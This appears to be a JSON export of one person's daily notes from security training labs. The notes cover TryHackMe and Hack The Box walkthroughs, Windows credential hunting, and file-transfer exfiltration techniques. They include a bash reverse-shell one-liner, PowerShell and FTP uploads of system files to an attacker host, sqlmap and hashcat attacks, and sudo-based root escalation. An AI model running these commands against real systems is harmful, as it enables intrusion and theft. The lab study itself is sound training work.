wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.\n10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31\n10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)\n10:02:53.950 - INFO    : Property manager:  None\n10:02:53.950 - INFO    : Domain controller: SimpleDomainController()\n10:02:53.950 - INFO    : Registered DAV providers by route:\n10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)\n10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)\n10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.\n10:02:53.950 - WARNING : Share '/' will allow anonymous write access.\n10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.\n10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2\n10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...\n```\n\n- Connecting to the Webdav Share\nNow we can attempt to connect to the share using the `DavWWWRoot` directory.\n\n```cmd\nC:\\htb\u003e dir \\\\192.168.49.128\\DavWWWRoot\n\n Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label.\n Volume Serial Number is 0000-0000\n\n Directory of \\\\192.168.49.128\\DavWWWRoot\n\n05/18/2022  10:05 AM    \u003cDIR\u003e          .\n05/18/2022  10:05 AM    \u003cDIR\u003e          ..\n05/18/2022  10:05 AM    \u003cDIR\u003e          sharefolder\n05/18/2022  10:05 AM                13 filetest.txt\n               1 File(s)             13 bytes\n               3 Dir(s)  43,443,318,784 bytes free\n```\n\n**Note:** `DavWWWRoot` is a special keyword recognised by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.\n\nYou can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: `\\192.168.49.128\\sharefolder`.\n\n- Uploading Files using SMB\n\n```cmd\nC:\\htb\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\nC:\\htb\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n```\n\n**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.\n\n### FTP Uploads\nUploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.\n\n- Uploading files using SMB:\n\n```shell\nPietra@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write\n\n/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.\n  warnings.warn(\"write permissions assigned to anonymous user.\",\n[I 2022-05-18 10:33:31] concurrency model: async\n[I 2022-05-18 10:33:31] masquerade (NAT) address: None\n[I 2022-05-18 10:33:31] passive ports: None\n[I 2022-05-18 10:33:31] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=5155 \u003c\u003c\u003c\n```\n\nNow let's use the PowerShell upload function to upload a file to our FTP Server.\n\n- PowerShell upload file:\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n```\n\n- Create a command file for the FTP client to upload a file:\n\n```cmd\nC:\\htb\u003e echo open 192.168.49.128 \u003e ftpcommand.txt\nC:\\htb\u003e echo USER anonymous \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo binary \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo PUT c:\\windows\\system32\\drivers\\etc\\hosts \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo bye \u003e\u003e ftpcommand.txt\nC:\\htb\u003e ftp -v -n -s:ftpcommand.txt\nftp\u003e open 192.168.49.128\nLog in with USER and PASS first.\nftp\u003e USER anonymous\n\nftp\u003e PUT c:\\windows\\system32\\drivers\\etc\\hosts\nftp\u003e bye\n```",
    "lastmodified": "2022-11-24T12:20:52.315118551Z",
    "tags": null
  },
  "/notes/daily/2022-07-07": {
    "title": "2022-07-07",
    "content": "# 2022-07-07\n---\n- Flag to ignore main:\n```bash\n--defsym=main=0x100\n```\n\n- To ignore `_start`:\n```bash\n-nostartfiles\n```\n\n\n## RelocID Pass\n- `*howto`:\n```bash\n{type = 224, size = 2, bitsize = 32, rightshift = 1, bitpos = 0, complain_on_overflow = complain_overflow_unsigned, negate = 0, pc_relative = 1, partial_inplace = 0, pcrel_offset = 1, src_mask = 0, dst_mask = 4293918720, special_function = 0x5555555cb8e0 \u003cbfd_elf_generic_reloc\u003e, name = 0x5555556c7506 \"R_RISCV_CVPCREL_UI12\"}\n```\n\n- `*rel`:\n```bash\n{r_offset = 2, r_info = 1504, r_addend = 0}\n```\n\n- value:\n` 3145728 `\n\nWe first do `CVPCREL` with the `*howto`:\n\n```bash\n{type = 224, size = 2, bitsize = 32, rightshift = 1, bitpos = 0, complain_on_overflow = complain_overflow_unsigned, negate = 0, pc_relative = 1, partial_inplace = 0, pcrel_offset = 1, src_mask = 0, dst_mask = 4293918720, special_function = 0x5555555cb8e0 \u003cbfd_elf_generic_reloc\u003e, name = 0x5555556c7506 \"R_RISCV_CVPCREL_UI12\"}\n```\n\nValue is set to `6`.\n\nThen we get to `RELOCID`:\n\n```bash\n{type = 59, size = 3, bitsize = 32, rightshift = 0, bitpos = 0, complain_on_overflow = complain_overflow_dont, negate = 0, pc_relative = 0, partial_inplace = 0, pcrel_offset = 0, src_mask = 0, dst_mask = 0, special_function = 0x5555555cb8e0 \u003cbfd_elf_generic_reloc\u003e, name = 0x5555556c7530 \"R_RISCV_RELOCID\"}\n```\n\n`value += rel-\u003er_addend` therefore 100 (the ID).\n\nWe get the previous relocation:\n\n```bash\nint prev_reloc = ELFNN_R_TYPE ((rel - 1))-\u003er_info);\n```\n\nThe `howto` turns into:\n\n```bash\n{type = 224, size = 2, bitsize = 32, rightshift = 1, bitpos = 0, complain_on_overflow = complain_overflow_unsigned, negate = 0, pc_relative = 1, partial_inplace = 0, pcrel_offset = 1, src_mask = 0, dst_mask = 4293918720, special_function = 0x5555555cb8e0 \u003cbfd_elf_generic_reloc\u003e, name = 0x5555556c7506 \"R_RISCV_CVPCREL_UI12\"}\n```\n\nAnd word is `3145851`.\n\n`rel` however, still points to `RELOCID` and not `CVPCREL`. I don't seem able to change the `value` (or `addend`) without accessing the actual relocation.\n\nWe go to `riscv_elf_rtype_to_howto` which looks for relocation 224 in the `howto` table and returns its location (`\u0026howto_table[i]`).\n\nWhen we get to `r_type = 58`, it jumps to `224`. Therefore, it replaces `RELOCID` with `CVPCREL` in the `howto` table (`RELOCID` points to `CVPCREL`).\n\nThe address being returned is:\n\n```bash\n(const reloc_howto_type *) 0x5555559043b8 \u003chowto_table+2360\u003e\n```\n\nWe are then sent to `elfnn-riscv.c:1765` aka the default of `perform_relocation`: `return bfd_reloc_notsupported`.\n\nIf I use the `riscv_reloc_type_lookup` function, then `prev_reloc` somehow points to `BFD_RELOC_MICROMIPS_GPREL16`. It seems to only get \n\n### HOWTO \nThe `howto` field can be imagined as a relocation instruction. It is a pointer to a structure which contains information on what to do with all of the other information in the relocation record and data section. A back end would normally have a relocation instruction set and turn relocations into pointers to the correct structure on input - but it would be possible to create each `howto` field on demand.",
    "lastmodified": "2022-11-24T12:20:52.452005029Z",
    "tags": null
  },
  "/notes/daily/2022-07-08": {
    "title": "2022-07-08",
    "content": "# 2022-07-08\n---\n## Nmap\n- Can use the `-Pn` switch to enumerate machines when packets are blocked by firewall.\n\n## SMB\n- Sever Message Block\n- Usually port 445\n\n```bash\nsmbclient -L {taget_IP} -U Administrator\n```\n\n## Impacket\nIt is a framework written in Python for working with network protocols. It is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB and MSRPC) the protol implementation itself. \n\nContains dozens of amazing tools for interacting with Windows systems and applications, many of which are ideal for attacking Windows and Active Directory.\n\n**Impacket** creates a remote service by uploading a randomly-named executable on the ADMIN$ share on the remote system and then register it as a Windows service.This will result in having an interactive shell available on the remote Windows system via TCP port 445 .  \n\n**PsExec** is  a portable tool that lets you run processes remotely using any user's credentials.\n\nIt requires credentials for a user with local administrator privileges or higher since reading/writing to the ADMIN$ share is required. Once you successfully authenticate, it will drop you into a NT   AUTHORITY\\SYSTEM shell.\n\n## Reversed File\n```bash\nstrings login.php.swp \u003e\u003e file.txt  \ntac file.txt\n```\n\n## Privilege Escalation\nUsing the find command:\n\n```bash\nsudo find . -exec /bin/sh \\; -quit\n```\n\n## Reverse Shell\n```bash\n/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0\u003e\u00261'\n```\n\n## More random stuff\nList strings in the file:\n\n```bash\nstrings -n 10 \u003cfilename\u003e\n```",
    "lastmodified": "2022-11-24T12:20:52.511976004Z",
    "tags": null
  },
  "/notes/daily/2022-07-15": {
    "title": "2022-07-15",
    "content": "# 2022-07-15\n---\n## Daily Bugle Writup (TryHackMe)\n```bash\nnmap -sV -sC 10.10.213.110\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 11:59 BST\nNmap scan report for 10.10.213.110\nHost is up (0.065s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)\n|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)\n|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)\n80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)\n| http-robots.txt: 15 disallowed entries \n| /joomla/administrator/ /administrator/ /bin/ /cache/ \n| /cli/ /components/ /includes/ /installation/ /language/ \n|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/\n|_http-title: Home\n|_http-generator: Joomla! - Open Source Content Management\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40\n3306/tcp open  mysql   MariaDB (unauthorized)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.80 seconds\n```\n\n- CMSeek:\n\n```\n[+]  Deep Scan Results  [+] \n\n[✔] Target: http://10.10.213.110\n[✔] Detected CMS: Joomla\n[✔] CMS URL: https://joomla.org\n[✔] Joomla Version: 3.7.0\n[✔] Readme file: http://10.10.213.110/README.txt\n[✔] Admin URL: http://10.10.213.110administrator\n\n\n[✔] Open directories: 4\n[*] Open directory url: \n   [\u003e] http://10.10.213.110administrator/modules\n   [\u003e] http://10.10.213.110administrator/templates\n   [\u003e] http://10.10.213.110images/banners\n   [\u003e] http://10.10.213.110administrator/components\n```\n\n- Found vulnerability:\nhttps://www.exploit-db.com/exploits/42033\n\n```bash\nsqlmap -u \"http://\u003cremote-ip\u003e/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump\n```\n\nRan this script: https://github.com/XiphosResearch/exploits/tree/master/Joomblah\n\nWhich needs **python2** and the module **requests** which can be installed with `pip2`. Used this to get `pip2`: https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate\n\nResult:\n\n```bash\n    .---.    .-'''-.        .-'''-.                                                           \n    |   |   '   _    \\     '   _    \\                            .---.                        \n    '---' /   /` '.   \\  /   /` '.   \\  __  __   ___   /|        |   |            .           \n    .---..   |     \\  ' .   |     \\  ' |  |/  `.'   `. ||        |   |          .'|           \n    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         \u003c  |           \n    |   |\\    \\     / / \\    \\     / / |  |  |  |  |  |||  __    |   |    __    | |           \n    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    \n    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \\ | | |/.'''. \\   \n    |   |                              |  |  |  |  |  |||     | ||   |`\" __ | | |  /    | |   \n    |   |                              |__|  |__|  |__|||\\    / '|   | .'.''| | | |     | |   \n __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   \n|      '                                               '  `'-'`       \\ \\._,\\ '/| '.    | '.  \n|____.'                                                                `--'  `\" '---'   '---' \n\n [-] Fetching CSRF token\n [-] Testing SQLi\n  -  Found table: fb9j5_users\n  -  Extracting users from fb9j5_users\n [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']\n  -  Extracting sessions from fb9j5_session\n```\n\nThen:\n\n```bash\nhashid crackme.txt                                                                                  4s\n--File 'crackme.txt'--\nAnalyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'\n[+] Blowfish(OpenBSD) \n[+] Woltlab Burning Board 4.x \n[+] bcrypt \n--End of file 'crackme.txt'--%\n```\n\nSo it is a Bcrypt hash, meaning it is resistant to GPU cracking :(\n\nI found this line to speed things up with **hashcat**:\n\n```bash\nsed -n '45000,50000p' \u0026ltpath-to-rockyou\u003e | hashcat -m3200 -a0 --force '\u0026lthash\u003e'\n```\n\nAccording to source:\n\n\"-   We use `sed` to extract lines 45000-50000 from the rockyou password list. These then get piped (`|`) into hashcat as possible passwords. We’re using those specific lines because I happen to know that the password is within that range, but I didn’t want to make it _too_ easy.\n-   We use hashcat with `-m3200` to target a bcrypt hash, and `-a0` to specify a wordlist attack. `--force` is used to ignore warnings and break the hashes regardless. We then specify the hash to be broken — either from a file or, as in this case, from `stdin` between single quotes (`' '`). Usually at this point we would also specify a wordlist, but we’re using the output of the `sed` command this time.\"\n\n- Standard **hashcat**:\n```bash\nhashcat -m3200 -a0 --force '\u003chash\u003e' \u003cpath-to-rockyou\u003e\n```\n\nSQLMap is taking a while and to no avail so far.\n\nCan update files in `Extensions -\u003e Templates -\u003e Templates` using the username (jonah) and password retrieved:\n\n```\n$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: bcrypt $2*$, Blowfish (Unix)\nHash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm\nTime.Started.....: Fri Jul 15 12:25:08 2022, (1 min, 52 secs)\nTime.Estimated...: Fri Jul 15 12:27:00 2022, (0 secs)\nGuess.Base.......: Pipe\nSpeed.#1.........:       16 H/s (7.64ms) @ Accel:1 Loops:128 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 1834\nRejected.........: 0\nRestore.Point....: 0\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:896-1024\nCandidates.#1....: spiderman123 -\u003e spiderman123\nStarted: Fri Jul 15 12:24:27 2022\nStopped: Fri Jul 15 12:27:02 2022\n```\n\nWe get a reverse shell and upload it: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n\nCreate a php file then edit it with the shell.\n\nWe can find a weird `configuration.php` file in `/var/www/html`.\n\n```bash\npublic $offline = '0';\n\tpublic $offline_message = 'This site is down for maintenance.\u003cbr /\u003ePlease check back again soon.';\n\tpublic $display_offline_message = '1';\n\tpublic $offline_image = '';\n\tpublic $sitename = 'The Daily Bugle';\n\tpublic $editor = 'tinymce';\n\tpublic $captcha = '0';\n\tpublic $list_limit = '20';\n\tpublic $access = '1';\n\tpublic $debug = '0';\n\tpublic $debug_lang = '0';\n\tpublic $dbtype = 'mysqli';\n\tpublic $host = 'localhost';\n\tpublic $user = 'root';\n\tpublic $password = 'nv5uz9r3ZEDzVjNu';\n\tpublic $db = 'joomla';\n\tpublic $dbprefix = 'fb9j5_';\n\tpublic $live_site = '';\n\tpublic $secret = 'UAMBRWzHO3oFPmVC';\n\tpublic $gzip = '0';\n\tpublic $error_reporting = 'default';\n\tpublic $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';\n\tpublic $ftp_host = '127.0.0.1';\n\tpublic $ftp_port = '21';\n\tpublic $ftp_user = '';\n\tpublic $ftp_pass = '';\n\tpublic $ftp_root = '';\n\tpublic $ftp_enable = '0';\n\tpublic $offset = 'UTC';\n\tpublic $mailonline = '1';\n\tpublic $mailer = 'mail';\n\tpublic $mailfrom = 'jonah@tryhackme.com';\n\tpublic $fromname = 'The Daily Bugle';\n\tpublic $sendmail = '/usr/sbin/sendmail';\n\tpublic $smtpauth = '0';\n\tpublic $smtpuser = '';\n\tpublic $smtppass = '';\n\tpublic $smtphost = 'localhost';\n\tpublic $smtpsecure = 'none';\n\tpublic $smtpport = '25';\n\tpublic $caching = '0';\n\tpublic $cache_handler = 'file';\n\tpublic $cachetime = '15';\n\tpublic $cache_platformprefix = '0';\n\tpublic $MetaDesc = 'New York City tabloid newspaper';\n\tpublic $MetaKeys = '';\n\tpublic $MetaTitle = '1';\n\tpublic $MetaAuthor = '1';\n\tpublic $MetaVersion = '0';\n\tpublic $robots = '';\n\tpublic $sef = '1';\n\tpublic $sef_rewrite = '0';\n\tpublic $sef_suffix = '0';\n\tpublic $unicodeslugs = '0';\n\tpublic $feed_limit = '10';\n\tpublic $feed_email = 'none';\n\tpublic $log_path = '/var/www/html/administrator/logs';\n\tpublic $tmp_path = '/var/www/html/tmp';\n\tpublic $lifetime = '15';\n\tpublic $session_handler = 'database';\n\tpublic $shared_session = '0';\n```\n\nThen used this to get to root:\n\n```bash\nTF=$(mktemp -d)\ncat \u003e$TF/x\u003c\u003cEOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat \u003e$TF/y.conf\u003c\u003cEOF\n[main]\nenabled=1\nEOF\n\ncat \u003e$TF/y.py\u003c\u003cEOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n```\n\n---\n\n- HashCat examples: https://hashcat.net/wiki/doku.php?id=example_hashes\n\n## Relevant (TryHackMe)\nFirst I enumerated:\n\n```bash\nnmap -sV -sC 10.10.169.49                                                                                                                                                                                                   INT\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 13:14 BST\nNmap scan report for 10.10.169.49\nHost is up (0.064s latency).\nNot shown: 995 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n| http-methods: \n|_  Potentially risky methods: TRACE\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: RELEVANT\n|   NetBIOS_Domain_Name: RELEVANT\n|   NetBIOS_Computer_Name: RELEVANT\n|   DNS_Domain_Name: Relevant\n|   DNS_Computer_Name: Relevant\n|   Product_Version: 10.0.14393\n|_  System_Time: 2022-07-15T12:15:10+00:00\n| ssl-cert: Subject: commonName=Relevant\n| Not valid before: 2022-07-14T12:13:29\n|_Not valid after:  2023-01-13T12:13:29\n|_ssl-date: 2022-07-15T12:15:50+00:00; 0s from scanner time.\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2022-07-15T12:15:14\n|_  start_date: 2022-07-15T12:13:48\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)\n|   Computer name: Relevant\n|   NetBIOS computer name: RELEVANT\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2022-07-15T05:15:13-07:00\n|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 54.07 seconds\n```\n\nThen checked the shares in SMB:\n\n```bash\nsmbclient -L 10.10.169.49                                                                                                                                                                                                   54s\nEnter WORKGROUP\\hanato's password: \n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tC$              Disk      Default share\n\tIPC$            IPC       Remote IPC\n\tnt4wrksv        Disk      \nSMB1 disabled -- no workgroup available\n```\n\nCan access `nt4wrksv`:\n\n```\nsmbclient \\\\\\\\10.10.169.49\\\\nt4wrksv\nEnter WORKGROUP\\hanato's password: \nTry \"help\" to get a list of possible commands.\nsmb: \\\u003e dir\n  .                                   D        0  Sat Jul 25 22:46:04 2020\n  ..                                  D        0  Sat Jul 25 22:46:04 2020\n  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020\n\n\t\t7735807 blocks of size 4096. 4948471 blocks available\n```\n\nThey look like this:\n\n```bash\ncat passwords.txt \n[User Passwords - Encoded]\nQm9iIC0gIVBAJCRXMHJEITEyMw==\nQmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk\n```\n\nAnd seem to be base64, so we decode:\n\n```bash\necho Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d             \nBob - !P@$$W0rD!123%\necho QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d\nBill - Juw4nnaM4n420696969!$$$\n```\n\n## Internal (TryHackMe)\n```bash\n[+] Performing password attack on Xmlrpc against 1 user/s\n[SUCCESS] - admin / my2boys                                                                                                                                                                                                                   \nTrying admin / marianita Time: 00:01:15 \u003c                                                                                                                                                            \u003e (3900 / 14348292)  0.02%  ETA: ??:??:??\n\n[!] Valid Combinations Found:\n | Username: admin, Password: my2boys\n```\n\n## Buffer Overflow Prep (TryHackMe)\n",
    "lastmodified": "2022-11-24T12:20:52.540508151Z",
    "tags": null
  },
  "/notes/daily/2022-07-17": {
    "title": "2022-07-17",
    "content": "# 2022-07-17\n---\nRemove duplicates and clean file:\n\n```bash\nsort \u003cfile\u003e | uniq \u003e \u003coutput_file\u003e\n```\n\nFind processes in shell:\n\n```bash\nfind / -perm -u=s -type f 2\u003e/dev/nul\n```\n\n## Windows Privilege Scalation\nThe easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.\n\nThis task will present some known places to look for passwords on a Windows system.\n\nBefore going into the task, remember to click the **Start Machine** button. You will be using the same machine throughout tasks 3 to 5. If you are using the **AttackBox**, this is also a good moment to start it as you'll be needing it for the following tasks.\n\nIn case you prefer connecting to the target machine via RDP, you can use the following credentials:\n\n**User:** `thm-unpriv`\n\n**Password:** `Password321`\n\n## Unattended Windows Installations\nWhen installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:\n\n-   C:\\Unattend.xml\n-   C:\\Windows\\Panther\\Unattend.xml\n-   C:\\Windows\\Panther\\Unattend\\Unattend.xml\n-   C:\\Windows\\system32\\sysprep.inf\n-   C:\\Windows\\system32\\sysprep\\sysprep.xml\n\nAs part of these files, you might encounter credentials:\n\n```shell-session\n\u003cCredentials\u003e\n    \u003cUsername\u003eAdministrator\u003c/Username\u003e\n    \u003cDomain\u003ethm.local\u003c/Domain\u003e\n    \u003cPassword\u003eMyPassword123\u003c/Password\u003e\n\u003c/Credentials\u003e\n```\n\n## Powershell History\nWhenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:\n\n```shell-session\ntype %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n```\n\n**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. \n\n## Saved Windows Credentials\nWindows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:\n\n```shell-session\ncmdkey /list\n```\n\nWhile you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.\n\n```shell-session\nrunas /savecred /user:admin cmd.exe\n```\n\n## IIS Configuration\nInternet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:\n\n-   C:\\inetpub\\wwwroot\\web.config\n-   C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\n\nHere is a quick way to find database connection strings on the file:\n\n```shell-session\ntype C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString\n```\n\n## Retrieve Credentials from Software: PuTTY\nPuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.\n\nTo retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:\n\n```shell-session\nreg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s\n```\n\n**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.\n\nJust as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.",
    "lastmodified": "2022-11-24T12:20:52.761397958Z",
    "tags": null
  },
  "/notes/daily/2022-07-24": {
    "title": "2022-07-24",
    "content": "# 2022-07-24\n## HTB - Catch\nCatching an API key out of an Android APK file.\n\n### Nmap\n```bash\n~/htb/catch \u003e sudo nmap -sC -sV -oA nmap/catch 10.10.11.150\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 10:06 BST\nNmap scan report for 10.10.11.150\nHost is up (0.044s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Catch Global Systems\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n3000/tcp open  ppp?\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/html; charset=UTF-8\n|     Set-Cookie: i_like_gitea=e34b4c6276830901; Path=/; HttpOnly\n|     Set-Cookie: _csrf=OXlC-5WFWNa3tjEGr1XYnx_tsI46MTY1ODY1MzYwMTgxMDQ5OTM0OQ; Path=/; Expires=Mon, 25 Jul 2022 09:06:41 GMT; HttpOnly; SameSite=Lax\n|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Sun, 24 Jul 2022 09:06:41 GMT\n|     \u003c!DOCTYPE html\u003e\n|     \u003chtml lang=\"en-US\" class=\"theme-\"\u003e\n|     \u003chead data-suburl=\"\"\u003e\n|     \u003cmeta charset=\"utf-8\"\u003e\n|     \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n|     \u003cmeta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"\u003e\n|     \u003ctitle\u003e Catch Repositories \u003c/title\u003e\n|     \u003clink rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Set-Cookie: i_like_gitea=63e4dc2088570d9a; Path=/; HttpOnly\n|     Set-Cookie: 